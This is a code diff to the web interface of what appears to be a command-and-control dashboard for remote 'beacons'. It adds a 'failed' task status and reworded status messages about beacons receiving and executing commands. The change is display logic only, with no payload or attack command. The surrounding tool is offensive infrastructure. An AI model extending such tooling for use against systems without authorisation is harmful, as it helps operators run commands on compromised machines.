@@ -1031,7 +1031,10 @@
                             statusClass = 'assembling';
                         }
                     } else if (task.status === 'sent') {
-                        displayStatus = 'EXECUTING';
+                        displayStatus = 'SENT';
+                    } else if (task.status === 'failed') {
+                        displayStatus = 'FAILED';
+                        statusClass = 'failed';
                     } else if (task.status === 'expired') {
                         displayStatus = 'EXPIRED';
                         statusClass = 'expired';
@@ -1132,10 +1135,32 @@
                     }
                     resultSection.style.display = 'block';
                 } else if (task.status === 'pending') {
-                    resultContent.innerHTML = '<div class="no-result">⏳ Task queued, waiting for beacon check-in...</div>';
+                    resultContent.innerHTML = '<div class="no-result">Task queued, waiting for beacon check-in...</div>';
                     resultSection.style.display = 'block';
                 } else if (task.status === 'sent') {
-                    resultContent.innerHTML = '<div class="no-result">⚡ Task sent, beacon is executing command...</div>';
+                    resultContent.innerHTML = '<div class="no-result">Task sent, waiting for beacon to start execution...</div>';
+                    resultSection.style.display = 'block';
+                } else if (task.status === 'failed') {
+                    const failureReason = task.result || 'Unknown failure reason';
+                    resultContent.innerHTML = `
+                        <div class="no-result">
+                            <div style="font-size: 32px; margin-bottom: 10px;">❌</div>
+                            <div style="font-size: 16px; margin-bottom: 10px; color: #ff6666;">Task Failed</div>
+                            <div style="color: #ff8888; margin: 15px 0; font-size: 13px; background: rgba(255,0,0,0.1); padding: 10px; border-radius: 4px;">
+                                ${escapeHtml(failureReason)}
+                            </div>
+                            <div style="color: #999; font-size: 12px; line-height: 1.6; margin-top: 15px;">
+                                Tasks are sent once and not retried automatically.<br>
+                                This task was marked as failed because the beacon did not execute it.<br>
+                                <br>
+                                <strong>Possible causes:</strong><br>
+                                • Beacon didn't receive the task (network issue)<br>
+                                • Beacon couldn't execute the command (permission/shell issue)<br>
+                                • Beacon crashed during execution<br>
+                                <br>
+                                You can create a new task if the beacon is still active.
+                            </div>
+                        </div>`;
                     resultSection.style.display = 'block';
                 } else if (task.status === 'expired') {
                     resultContent.innerHTML = `
@@ -1187,7 +1212,7 @@
                         </div>`;
                     resultSection.style.display = 'block';
                 } else {
-                    resultContent.innerHTML = '<div class="no-result">❌ No result available</div>';
+                    resultContent.innerHTML = '<div class="no-result">No result available</div>';
                     resultSection.style.display = 'block';
                 }
 
